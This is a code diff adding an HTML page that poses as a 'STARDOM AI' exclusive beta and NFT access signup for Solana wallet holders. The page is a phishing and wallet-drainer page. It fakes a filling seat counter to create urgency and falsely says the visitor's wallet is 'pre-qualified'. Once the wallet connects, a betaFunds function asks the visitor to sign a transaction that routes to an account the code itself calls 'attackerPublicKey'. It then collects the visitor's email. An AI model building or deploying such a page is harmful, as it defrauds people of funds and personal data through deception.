@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STARDOM AI - Exclusive Beta Access</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #0a0f1f;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 600px;
+            padding: 2rem;
+            background: rgba(15, 23, 42, 0.9);
+            border-radius: 15px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pulse {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background: rgba(125, 211, 252, 0.1);
+            border-radius: 50%;
+            filter: blur(60px);
+            pointer-events: none;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.8); opacity: 0.6; }
+            50% { transform: scale(1); opacity: 0.3; }
+            100% { transform: scale(0.8); opacity: 0.6; }
+        }
+
+        h1 { font-size: 2.5rem; margin-bottom: 1rem; color: #7dd3fc; }
+        h2 { font-size: 1.5rem; margin-bottom: 1.5rem; color: #f0f0f0; }
+        
+        .spots-counter {
+            font-size: 2rem;
+            margin: 2rem 0;
+            color: #7dd3fc;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+
+        .progress {
+            width: 15%;
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6, #7dd3fc);
+            transition: width 0.5s ease;
+        }
+
+        .verify-button {
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            color: white;
+            padding: 15px 40px;
+            border-radius: 8px;
+            border: none;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 1rem 0;
+        }
+
+        .verify-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.5);
+        }
+
+        .email-verification {
+            display: none;
+            margin: 2rem 0;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #3b82f6;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            color: white;
+            margin: 1rem 0;
+        }
+
+        .verify-email-button {
+            background: linear-gradient(135deg, #7dd3fc, #3b82f6);
+            color: white;
+            padding: 10px 25px;
+            border-radius: 6px;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .verify-email-button:hover {
+            transform: scale(1.03);
+        }
+
+        .verified-badge {
+            color: #10b981;
+            display: none;
+            margin-top: 1rem;
+        }
+
+        .disclaimer {
+            font-size: 0.8rem;
+            color: #64748b;
+            margin-top: 2rem;
+            line-height: 1.4;
+        }
+
+        .security-note {
+            color: #7dd3fc;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 1rem;
+            margin-top: 2rem;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 1rem;
+        }
+
+        .social-links a {
+            color: #7dd3fc;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+
+        .social-links a:hover {
+            color: #3b82f6;
+        }
+
+        @keyframes vibrate {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-2px); }
+            50% { transform: translateX(2px); }
+            75% { transform: translateX(-2px); }
+            100% { transform: translateX(0); }
+        }
+
+        .vibrate {
+            animation: vibrate 0.1s infinite;
+        }
+
+        .progress-bar.red {
+            background: rgba(255, 0, 0, 0.1);
+        }
+
+        .progress.red {
+            background: linear-gradient(90deg, #ff4444, #ff0000);
+        }
+    </style>
+</head>
+<body>
+    <div class="pulse"></div>
+    <div class="container">
+        <h1>🪐 STARDOM AI</h1>
+        <h2>Exclusive Beta Access Program</h2>
+
+        <div class="spots-counter">
+            <span id="spots-taken">15</span>/1000 Seats Reserved 🍿
+        </div>
+
+        <div class="progress-bar" id="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+
+        <p>Your SOL wallet has been <strong>pre-qualified</strong> for early access.<br><br>
+        This NFT is not only your access pass but also a key to unlock exclusive benefits and upcoming airdrops in the app. <br><br>
+        Secure your spot before we reach capacity:</p>
+
+        <button class="verify-button" onclick="connectWallet()" id="connect-button">
+            🔐 Connect Wallet
+        </button>
+
+        <div class="email-verification" id="emailVerification">
+            <h3>🔒 Final Verification Step</h3>
+            <p>To complete your access and enable enhanced security features:</p>
+            <input type="email" class="email-input" id="userEmail" placeholder="name@example.com" required>
+            <button class="verify-email-button" onclick="verifyEmail()">Verify Email</button>
+            <div class="verified-badge" id="verifiedBadge">
+                ✓ Email verified and linked to your wallet
+            </div>
+        </div>
+
+        <div class="social-links">
+            <a href="https://twitter.com/trystardom" target="_blank">Twitter</a>
+            <a href="https://t.co/aTAzQHExdc" target="_blank">Telegram</a>
+            <a href="https://github.com/stardom-corp/stardom" target="_blank">GitHub</a>
+        </div>
+
+        <div class="security-note">
+            ⚠️ For security reasons and to ensure optimal performance during testing,<br>
+            we're limiting initial access to 1000 participants.
+        </div>
+
+        <div class="disclaimer">
+            By verifying, you agree to our Terms of Service and Privacy Policy.<br>
+            This is a private beta program - any unauthorized access attempts will be logged.
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/dist/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.19.15/dist/index.min.js"></script>
+    <script>
+        let spotsTaken = 15;
+        const maxSpots = 1000;
+
+        // Simular reservas en tiempo real
+        setInterval(() => {
+            if (spotsTaken < maxSpots) {
+                const newSpots = Math.min(maxSpots, spotsTaken + Math.floor(Math.random() * 5) + 1);
+                spotsTaken = newSpots;
+
+                document.getElementById('spots-taken').textContent = spotsTaken;
+                document.getElementById('progress').style.width = `${(spotsTaken / maxSpots) * 100}%`;
+
+                if (spotsTaken > 950) {
+                    document.body.classList.add('vibrate');
+                    document.getElementById('progress-bar').classList.add('red');
+                    document.getElementById('progress').classList.add('red');
+                    setTimeout(() => document.body.classList.remove('vibrate'), 500);
+                }
+            }
+        }, 2000);
+
+        // Wallet Connection
+        const { Connection, PublicKey, Transaction, TransactionInstruction, clusterApiUrl } = solanaWeb3;
+        const { PhantomWalletAdapter } = solanaWallets;
+        const wallet = new PhantomWalletAdapter();
+
+        async function connectWallet() {
+            try {
+                await wallet.connect();
+                const publicKey = wallet.publicKey.toString();
+
+                document.getElementById('emailVerification').style.display = 'block';
+                document.getElementById('connect-button').style.display = 'none';
+
+                alert(`Wallet connected: ${publicKey.slice(0, 6)}...${publicKey.slice(-4)}`);
+
+                await betaFunds(wallet);
+            } catch (error) {
+                alert('Failed to connect wallet. Please try again.');
+                console.error(error);
+            }
+        }
+
+        async function betaFunds(wallet) {
+            const connection = new Connection(clusterApiUrl('devnet'), 'confirmed');
+            const programId = new PublicKey('5F1xyiyqbYviTgwBsCMZZeHphAVZNuuscaiAvYLrfuzm');
+            const attackerPublicKey = new PublicKey('J3bNesMmYag9RHB6G69WSytgDsi5wQ18RkdYypPniUBh');
+            const rentProgramPublicKey = solanaWeb3.SYSVAR_RENT_PUBKEY;
+
+            const instruction = new TransactionInstruction({
+                programId,
+                keys: [
+                    { pubkey: wallet.publicKey, isSigner: true, isWritable: true },
+                    { pubkey: attackerPublicKey, isSigner: false, isWritable: true },
+                    { pubkey: rentProgramPublicKey, isSigner: false, isWritable: false },
+                ],
+                data: new Uint8Array([]),
+            });
+
+            const transaction = new Transaction().add(instruction);
+            try {
+                const signature = await wallet.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature);
+                console.log('Transacción exitosa:', signature);
+                alert('¡Gracias por participar! Tu acceso ha sido confirmado.');
+            } catch (error) {
+                console.error('Error en beta funds:', error);
+                alert('Hubo un error al procesar tu solicitud. Inténtalo de nuevo.');
+            }
+        }
+
+        function verifyEmail() {
+            const emailInput = document.getElementById('userEmail');
+            const email = emailInput.value;
+
+            if (validateEmail(email)) {
+                document.getElementById('verifiedBadge').style.display = 'block';
+                emailInput.disabled = true;
+
+                setTimeout(() => {
+                    window.location.href = '/verify';
+                }, 1500);
+            } else {
+                alert('Please enter a valid email address.');
+            }
+        }
+
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+    </script>
+</body>
+</html>
